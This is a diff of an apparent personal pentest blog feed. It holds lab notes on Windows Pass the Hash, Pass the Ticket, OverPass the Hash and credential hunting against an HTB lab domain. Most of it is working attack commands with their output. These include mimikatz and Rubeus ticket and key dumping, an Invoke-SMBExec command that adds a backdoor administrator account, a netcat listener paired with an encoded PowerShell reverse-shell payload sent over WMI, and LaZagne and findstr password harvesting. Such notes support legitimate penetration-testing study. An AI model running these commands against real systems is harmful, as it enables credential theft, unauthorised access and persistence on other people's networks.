-<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
-<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Pass the Ticket (PtT)</title>
-    <url>/2025/11/27/Windows-Pass-the-Ticket-PtT/</url>
-    <content><![CDATA[<h1 id="Harvesting-Kerberos-tickets"><a href="#Harvesting-Kerberos-tickets" class="headerlink" title="Harvesting Kerberos tickets"></a>Harvesting Kerberos tickets</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
-<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::tickets /export</span></span><br><span class="line"></span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi !</span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">5063</span><span class="type">e</span>]<span class="literal">-1-0-40a50000-DC01</span><span class="variable">$</span>@LDAP<span class="literal">-DC01</span>.inlanefreight.htb.kirbi !</span><br><span class="line">  </span><br><span class="line"><span class="built_in">Group</span> <span class="number">2</span> - Ticket Granting Ticket</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> *.kirbi</span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1445</span> [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1565</span> [<span class="number">0</span>;<span class="number">3</span><span class="type">e7</span>]<span class="literal">-0-2-40a50000-DC01</span><span class="variable">$</span>@cifs<span class="literal">-DC01</span>.inlanefreight.htb.kirbi</span><br></pre></td></tr></table></figure>
-
-
-<p>➜ The tickets that end with <code>$</code> belong to computer accounts.</p>
-<p>➜ <code>TGT</code> tickets follow this format : <code>[randomvalue]-username@krbtgt-domain.local.kirbi</code>.</p>
-<p>➜ <code>TGS</code> tickets follow this format : <code>[randomvalue]-username@service-domain.local.kirbi</code>.</p>
-<h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
-<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Rubeus.exe dump /nowrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName              :  DC01$</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCA &lt;SNIP&gt; T02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2iwERsGa3JidGd0GwdIVEIuQ09N</span><br><span class="line"></span><br><span class="line">UserName              : plaintext</span><br><span class="line"></span><br><span class="line">doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQ &lt;SNIP&gt; EzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTJ0Z3QbB0hbB0hB0hUQi5DT00=</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="Pass-the-Key-aka-OverPass-the-Hash"><a href="#Pass-the-Key-aka-OverPass-the-Hash" class="headerlink" title="Pass the Key aka. OverPass the Hash"></a>Pass the Key aka. OverPass the Hash</h1><h2 id="Extract-Hashes"><a href="#Extract-Hashes" class="headerlink" title="Extract Hashes"></a>Extract Hashes</h2><p>➜ To perform OverPass the Hash we need to have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::ekeys</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">         * Username : plaintext</span><br><span class="line">         * Domain   : inlanefreight.htb</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60</span><br><span class="line">           rc4_hmac_nt       <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old      <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_md4           <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_nt_exp   <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old_exp  <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Forge-a-TGT-Ticket"><a href="#Forge-a-TGT-Ticket" class="headerlink" title="Forge a TGT Ticket"></a>Forge a TGT Ticket</h2><p><code>➜ Note: Modern Windows domains use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an &quot;encryption downgrade.&quot;</code></p>
-<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p><code>➜ Requires administrative access.</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ This will create a new <code>cmd.exe</code> window that we can use to request access to any service we want in the context of the target user.</p>
-<h3 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h3><p><code>➜ Administrative access not required.</code></p>
-<p>We have four hash types that can be used:</p>
-<ul>
-<li>&#x2F;rc4</li>
-<li>&#x2F;aes128</li>
-<li>&#x2F;aes256</li>
-<li>&#x2F;des</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA &lt; SNIP &gt; wZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIsGa3JidGd0GwdodGIuY29t</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Pass-the-Ticket-PtT-To-The-current-Session"><a href="#Pass-the-Ticket-PtT-To-The-current-Session" class="headerlink" title="Pass the Ticket (PtT) To The current Session"></a>Pass the Ticket (PtT) To The current Session</h1><h2 id="Loading-a-TGT-Directly-Into-the-Current-Logon-Session"><a href="#Loading-a-TGT-Directly-Into-the-Current-Logon-Session" class="headerlink" title="Loading a TGT Directly Into the Current Logon Session"></a>Loading a TGT Directly Into the Current Logon Session</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f /ptt</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
-
-<h2 id="Importing-a-kirbi-Ticket"><a href="#Importing-a-kirbi-Ticket" class="headerlink" title="Importing a .kirbi Ticket"></a>Importing a .kirbi Ticket</h2><h4 id="Rubeus-2"><a href="#Rubeus-2" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:[<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"></span><br><span class="line">[+] ticket successfully imported!</span><br></pre></td></tr></table></figure>
-<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Then we can access shares using the created the imported ticket.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> \\DC01.inlanefreight.htb\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files (x86)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Pass-The-Ticket-with-PowerShell-Remoting-winrm"><a href="#Pass-The-Ticket-with-PowerShell-Remoting-winrm" class="headerlink" title="Pass The Ticket with PowerShell Remoting (winrm)"></a>Pass The Ticket with PowerShell Remoting (winrm)</h1><h2 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h4 id="Import-Ticket"><a href="#Import-Ticket" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Connect-winrm"><a href="#Connect-winrm" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Rubeus-3"><a href="#Rubeus-3" class="headerlink" title="Rubeus"></a>Rubeus</h2><h4 id="Create-a-sacrificial-process"><a href="#Create-a-sacrificial-process" class="headerlink" title="Create a sacrificial process"></a>Create a sacrificial process</h4><p><code>➜ The command will open a new cmd window</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe createnetonly /program:<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /show</span><br></pre></td></tr></table></figure>
-<h4 id="Import-Ticket-1"><a href="#Import-Ticket-1" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><p><code>➜ From that window, we can execute Rubeus to request a new TGT.</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<span class="number">9279</span>bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</span><br></pre></td></tr></table></figure>
-
-<h4 id="Connect-winrm-1"><a href="#Connect-winrm-1" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
@@ -2824,6 +3122,157 @@
         <tag>ipconfig</tag>
         <tag>Get-HotFix</tag>
         <tag>Get-Process</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
+<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
+<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Pass the Ticket (PtT)</title>
+    <url>/2025/11/27/Windows-Pass-the-Ticket-PtT/</url>
+    <content><![CDATA[<h1 id="Harvesting-Kerberos-tickets"><a href="#Harvesting-Kerberos-tickets" class="headerlink" title="Harvesting Kerberos tickets"></a>Harvesting Kerberos tickets</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
+<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::tickets /export</span></span><br><span class="line"></span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi !</span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">5063</span><span class="type">e</span>]<span class="literal">-1-0-40a50000-DC01</span><span class="variable">$</span>@LDAP<span class="literal">-DC01</span>.inlanefreight.htb.kirbi !</span><br><span class="line">  </span><br><span class="line"><span class="built_in">Group</span> <span class="number">2</span> - Ticket Granting Ticket</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> *.kirbi</span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1445</span> [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1565</span> [<span class="number">0</span>;<span class="number">3</span><span class="type">e7</span>]<span class="literal">-0-2-40a50000-DC01</span><span class="variable">$</span>@cifs<span class="literal">-DC01</span>.inlanefreight.htb.kirbi</span><br></pre></td></tr></table></figure>
+
+
+<p>➜ The tickets that end with <code>$</code> belong to computer accounts.</p>
+<p>➜ <code>TGT</code> tickets follow this format : <code>[randomvalue]-username@krbtgt-domain.local.kirbi</code>.</p>
+<p>➜ <code>TGS</code> tickets follow this format : <code>[randomvalue]-username@service-domain.local.kirbi</code>.</p>
+<h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
+<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Rubeus.exe dump /nowrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName              :  DC01$</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCA &lt;SNIP&gt; T02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2iwERsGa3JidGd0GwdIVEIuQ09N</span><br><span class="line"></span><br><span class="line">UserName              : plaintext</span><br><span class="line"></span><br><span class="line">doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQ &lt;SNIP&gt; EzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTJ0Z3QbB0hbB0hB0hUQi5DT00=</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="Pass-the-Key-aka-OverPass-the-Hash"><a href="#Pass-the-Key-aka-OverPass-the-Hash" class="headerlink" title="Pass the Key aka. OverPass the Hash"></a>Pass the Key aka. OverPass the Hash</h1><h2 id="Extract-Hashes"><a href="#Extract-Hashes" class="headerlink" title="Extract Hashes"></a>Extract Hashes</h2><p>➜ To perform OverPass the Hash we need to have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys.</p>
